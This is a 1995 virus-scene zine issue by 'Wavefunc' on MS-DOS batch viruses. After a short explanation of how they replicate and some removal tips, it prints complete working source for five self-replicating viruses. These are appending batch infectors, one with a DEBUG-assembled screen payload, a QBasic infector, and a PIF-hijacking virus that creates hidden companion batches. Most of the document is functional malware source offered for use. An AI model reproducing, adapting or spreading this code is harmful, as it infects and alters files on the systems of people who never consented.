
      ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
      บ  Batch Viruses by "Wavefunc" - Second Issue - Sept. 2 1995  บ
      ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

All of these replicating programs require standard MSDOS 6 to function
properly. The FIND command must return an errorlevel or they won't work.

I'll despense with the boring warnings, suffice it to say if you utilize
any of this in a irresponsible or damaging way then you are responsible
for whatever your actions cause.

As written these programs are not damaging to data and will only affect
BAT, BAS and PIF files. One could say this is still data but no malice is
intended. Art maybe. Others might not be so nice - batch viruses are
perfectly capable of carrying deadly payloads.

Recovery from these creatures is easy - load the batch or basic file into
EDIT and remove the added virus code. In the case of the PIF virus use
the Windows PifEdit program to change the ...bat in the filename field
back to ...com or ...exe and remove the hidden companion batch. Some of
these viruses make hidden files, use 'DIR \ /AH /S' to find them then for
each file that is actually a virus issue 'ATTRIB file -H' then 'DEL file'.
Make sure you remove only virus files, leave hidden system files like
MSDOS.SYS and IO.SYS (and others) alone!


            About batch viruses
            -------------------

Reproducing batch programs use the FIND command to separate its code
from the program that code is attached to. For this to work, every
replicating line in the virus must contain a specific string, the key
string of the virus. Another vital component of a replicating batch
is the FOR command, used to scan for other batch files, usually with
the mask "*.BAT". A variety of commands can be used for the actual
infection, including FIND, TYPE, ECHO, COPY and MOVE. Simple batch
replicators just append their code at the end of batches in the hopes
it will run (usually it does). Advanced infectors modify the start of
the batch to force the issue. In such cases the added first line does
not contain the key string but is added by an ECHO within the virus.

This is not the only type of batch virus! Batch viruses can be written
in assembly and use either DEBUG or ECHO to hide the virus code in hex
or text which is attached to infected batches. These tend to be very
advanced. A batch file can also rename a binary then copy itself to a
batch with the same base name. This one's been around for a while.

Most of the viruses presented here become a self contained part of the
host, giving them that coveted ability of travel. Machine code is used
only for specific functions, not for reproduction. That is done with
plain old DOS. Only DOS 6 seems vulnerable to these types of viruses,
I have no information on PCDOS, 4DOS or other operating environments.
They run on my system and probably on many others.

At the end of this document is an encoded batch that will detect most
(practically all) batch viruses of this type and also suspicious code
that might indicate a trojan or advanced batch virus of the assembly
type. Use a UU decoder to extract the file "BATALERT.BAT".


            Batch virus "_!"
            ----------------

 Infects parent and current directories
 Virus code is appended to the host batch
 Only works if host is in current directory
 Infects just one batch unless new clean batches are added

This is a very simple batch virus. When it runs it appends its code
to another batch file in the parent or current directory. It is not
very effective but illustrates the basics.

----------------------------(cut here)------------------------------------
@ctty nul._!
for %%a in (*.bat ..\*.bat) do set _!=%%a
find "_!"<%_!%
if errorlevel 1 find "_!"<%0.BAT>>%_!%
ctty con._!
----------------------------(cut here)------------------------------------


            Batch virus "BfV"
            -----------------

 Creates the hidden file "_BFV" in the root directory of drive C
 Infects one batch per run in current and parent directories
 Gives up after encountering seven infected batches
 Virus code is appended to the host batch

This is an improved appender. It only has to be run from its own directory
once to enable it to reproduce even when the host is in a path directory.
To avoid slowing batch files down too much it exits if it can't infect
after checking seven batch files. If the host batch ends with nul characters
it removes them so the virus code will run.

----------------------------(cut here)------------------------------------
@echo off%[BfV_B]%
if '%1=='## goto BfV_%2
if exist C:\_BfV.bat goto BfV_
if not exist %0.bat goto BfV_end
find "BfV"<%0.bat>C:\_BfV.bat
attrib C:\_BfV.bat +h
:BfV_
command /e:5000 /c C:\_BfV ## run
goto BfV_end
:BfV_run
for %%i in (*.bat ..\*.bat) do call C:\_BfV ## inf %%i
exit BfV
:BfV_inf
if '%BfV%=='1111111 exit
set BfV=%BfV%1
find "BfV"<%3>nul
if not errorlevel 1 goto BfV_end
type %3>BfV
type C:\_BfV.bat>>BfV
move BfV %3>nul
exit BfV
:BfV_end
----------------------------(cut here)------------------------------------


            Batch virus "MeLT"
            ------------------

 Creates the hidden file "MELT_2A" in the temp directory
 Infects files in the current, parent and all path directories
 Infects one batch per run if less than ten infected files encountered
 After detecting ten infected files it displays a graphics screen effect
 Adds one line before the host batch and appends the rest
 Will not run if attached to AUTOEXEC.BAT (but infects it)

This batch virus is much more advanced. It takes control from the host
immediately, runs the virus then runs the host batch. The host is run in
such a way as to disable the virus until the host is completely finished
to avoid slowing down batch files that call themselves in a loop. Simple
appenders are very obvious when on such files, but this one causes no
significant speed loss except at startup. This virus carries a harmless
payload which is assembled with the debug command - it 'melts' the screen
in a flash of color then returns it to normal before running the host.

----------------------------(cut here)------------------------------------
@if not '%0==' if '%_melt%==' goto meltbeg
::---- dummy host --------
@echo off
echo Hello World!
::---- end dummy host ----

@goto MeLTend [MeLT_2a]
:MeLTbeg
@echo off%_MeLT%
if '%1=='MeLT goto MeLT%2
if not exist %comspec% set comspec=%_MeLT%command
%comspec% /e:5000 /c %0 MeLT vir
set MeLTcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 MeLT rh
set _MeLT=
set MeLTcl=
goto MeLTend
:MeLTrh
set _MeLT=x
%0 %MeLTcl%
:MeLTvir
set MeLTH=%0
if not exist %_MeLT%%temp%\nul set temp=%tmp%
if exist %temp%\MeLT_2a goto MeLTrun
%0 MeLT fnd . %path%
:MeLTfnd
shift%_MeLT%
if '%2==' exit MeLT
set MeLT=%2\%MeLTH%.bat
if not exist %MeLT% set MeLT=%2\%MeLTH%
if not exist %MeLT% set MeLT=%2%MeLTH%.bat
if not exist %MeLT% set MeLT=%2%MeLTH%
if not exist %MeLT% goto MeLTfnd
find "MeLT"<%MeLT%>%temp%\MeLT_2a
attrib %temp%\MeLT_2a +h
:MeLTrun
%MeLTH% MeLT s . .. %path%
:MeLTs
shift%_MeLT%
if '%2==' exit MeLT
for %%a in (%2\*.bat %2*.bat) do call %MeLTH% MeLT inf %%a
goto MeLTs
:MeLTinf
find /i "MeLT"<%3>nul
if not errorlevel 1 goto MeLTno
echo @if not '%%0==' if '%%_melt%%==' goto meltbeg>MeLT.t
type %3>>MeLT.t
echo.>>MeLT.t
type %temp%\MeLT_2a>>MeLT.t
move MeLT.t %3>nul
exit MeLT
:MeLTact - flash-melt screen text then put back to normal
echo e 100 BA D0 07 BB 00 B8 8E C3 8B CA 33 FF 26 8B 05 FE>MeLT.t
echo e 110 C0 FE C4 26 89 05 47 47 E2 F2 FE 06 24 01 75 E8>>MeLT.t
echo e 120 B4 4C CD 21 00>>MeLT.t
echo g>>MeLT.t
debug<MeLT.t>nul
del MeLT.t
exit MeLT
:MeLTno
set MeLTC=%MeLTC%1
if %MeLTC%==1111111111 goto MeLTact
:MeLTend
----------------------------(cut here)------------------------------------


            QBasic virus "BasVir"
            ---------------------

 Infects one BAS file in the current directory per run
 Inserts its code in front of the host so it will run first
 Does not infect QBasic programs that contain "DECLARE"
 Really a batch virus that hides in BASIC code
 If the host is renamed the virus won't work

I wrote this in response to someone's request on the net for a virus
written in BASIC. I hope they don't mind if the BASIC program makes
a batch and runs it. It stays out of programs that use procedures to
avoid causing errors, such programs cannot tolerate prepended code.
This is really a joke, but it's a QBasic virus (no? you write one.)

The following must be named BASVIR.BAS to function.

----------------------------(cut here)------------------------------------
basvirH$ = "BASVIR.BAS"
OPEN "~$.bat" FOR OUTPUT AS #2: REM BasVir
PRINT #2, "@echo off %BasVir1%"
PRINT #2, "if '%1=='BasVir goto BasVir%2"
PRINT #2, "for %%a in (*.bas) do call ~$ BasVir 2 %%a"
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVir2"
PRINT #2, "find "; CHR$(34); "DECLARE "; CHR$(34); "<%3>nul": REM BasVir
PRINT #2, "if not errorlevel 1 goto BasVirE"
PRINT #2, "echo basvirH$ = "; CHR$(34); "%3"; CHR$(34); ">~1": REM BasVir
PRINT #2, "find "; CHR$(34); "BasVir"; CHR$(34); "<"; basvirH$; ">>~1"
PRINT #2, "copy %3 ~2>nul": REM BasVir
PRINT #2, "copy /b ~1+~2 %3>nul": REM BasVir
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVirE"
CLOSE #2: REM BasVir
SHELL "~$": REM BasVir
SHELL "del ~?.*": REM BasVir
REM ******* [BasVir] the QBasic Virus *******
REM This is a dummy host program
SYSTEM
----------------------------(cut here)------------------------------------


            PIF virus "PiFV"
            ----------------

 Creates hidden batch files with the same base name as host
 Modifies PIF to run the hidden batch instead of host program
 After infecting more PIFs the companion batch runs the host
 Sometimes displays a stupid message on Saturdays (it was late)

This might be the first PIF virus. One problem with PIF infection is
the PIF file must be actually run or it won't work. If the user runs
the actual program the virus won't work. It has other problems but is
functional enough for a demo. I don't feel up to fixing it right now.
It's pretty infectious right now...

----------------------------(cut here)------------------------------------
:: Windows PIF Virus (in batch!)
:: Prog by WaveFunc May 13, 1995
:: (these comments will not replicate)
::
:: This is a virus that 'infects' PIF files, used by Windows to
:: run DOS programs. It works by creating hidden companion batches
:: containing copies of this then altering the PIF file so that the
:: companion batch runs first. After the companion runs it runs the
:: original host program, the name of which is encoded into the
:: companion. The pif files are marked so that they will not be
:: re-infected. Only PIFs are affected, no changes are made to
:: the infected programs. To 'cure', use PIFEDIT to restore the
:: original filenames then delete the hidden files.
::
@echo off
:: host filename...
set pifvo=LIST.COM
:: loop dispatcher...
if '%1=='PiFV goto PiFV_%2
:: run the virus!
set _PiFV=
if not exist %comspec% set comspec=C:\COMMAND.COM%_PiFV%
%comspec% /e:5000 /c %0 PiFV go>nul
if exist PiFV! del PiFV!
:: run the host
set PiFVcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 PiFV hst
set PiFVo=
set PiFVcl=
:: check for activation...
echo.|date|find /i "sat">nul.PiFV
if errorlevel 1 goto PiFV_end
echo.|time|find "7">nul.PiFV
if errorlevel 1 goto PiFV_msg
set PiFV=echo
cls%_PiFV%
%PiFV%.
%PiFV% There once was an Otter named Oscer
%PiFV% Who claimed to know how to make water.
%PiFV% "No more dams," he said, "use my water instead!"
%PiFV% But the Elder Otter was not impressed.
pause>nul.PiFV
set PiFV=
goto PiFV_end
:PiFV_msg
echo [PiFV] by WaveFunc
goto PiFV_end
:PiFV_hst
%PiFVo% %PiFVcl%
goto PiFV_end
:PiFV_go
set PiFVh=%0
if not exist %PiFVh% set PiFVh=%0.bat
if not exist %PiFVh% exit
for %%a in (*.pif) do call %0 PiFV inf %%a
exit PiFV
:PiFV_inf
set PiFVp=%3
:: get victim filename and infection marker
:: from PIF file using debug...
if exist PiFV! goto PiFV_1
echo m 124,162 524>PiFV!
echo e 100 '@set fn='>>PiFV!
echo m 524,562 108>>PiFV!
echo n pifv$.bat>>PiFV!
echo rcx>>PiFV!
echo 47>>PiFV!
echo w>>PiFV!
echo m 55E,561 108>>PiFV!
echo e 10C 0>>PiFV!
echo n pifv$$.bat>>PiFV!
echo rcx>>PiFV!
echo 10>>PiFV!
echo w>>PiFV!
echo q>>PiFV!
:PiFV_1
debug %PiFVp%<PiFV!>nul
call PiFV$
set PiFVn=%fn%
call PiFV$$
set PiFVi=%fn%
del PiFV$?.bat
:: pifvn=orig filename
:: pifvi=infection marker
:: pifvp=pif filename
:: pifvh=companion bat file
:: skip infected or 'empty' pifs...
if '%PiFVi%=='PiFV goto PiFV_end
if '%PiFVn%==' goto PiFV_end
:: don't shadow command.com (be nice)
echo %PiFVn%|find /i "command">nul
if not errorlevel 1 goto PiFV_end
:: infectable - create a companion batch...
:: (the following code strips off the extension)
echo e 100 e8 16 00 b4 08 cd 21 3c 00 74 0c 3c 2e 74 08 88>PiFV$$
echo e 110 c2 b4 02 cd 21 eb ec cd 20 ba 21 01 b4 09 cd 21>>PiFV$$
echo e 120 c3 73 65 74 20 66 6e 3d 24 00>>PiFV$$
echo n pifv$.com>>PiFV$$
echo rcx>>PiFV$$
echo 2a>>PiFV$$
echo w>>PiFV$$
echo q>>PiFV$$
debug<PiFV$$>nul
echo %PiFVn%|PiFV$>PiFV$$.bat
call PiFV$$
set PiFVb=%fn%.bat
del PiFV$?.*
:: pifvb=new batch name
:: do not shadow if comp has same name as host
if %PiFVo%==%PiFVb% goto PiFV_end
if exist %PiFVb% goto PiFV_end
echo @echo off>%PiFVb%
echo set pifvo=%pifvn%>>%PiFVb%
find "PiFV"<%PiFVh%>>%PiFVb%
attrib %PiFVb% +h
:: ...and point the PIF at the companion
echo e 15E 'PiFV',0>PiFV$$
echo e 124 '%PiFVb%',0>>PiFV$$
echo w>>PiFV$$
echo q>>PiFV$$
debug %PiFVp%<PiFV$$>nul
del PiFV$$
:: I think we're done!
exit PiFV
:PiFV_end
:: wonder how many bugs all this has in it? Only one
:: way to find out...
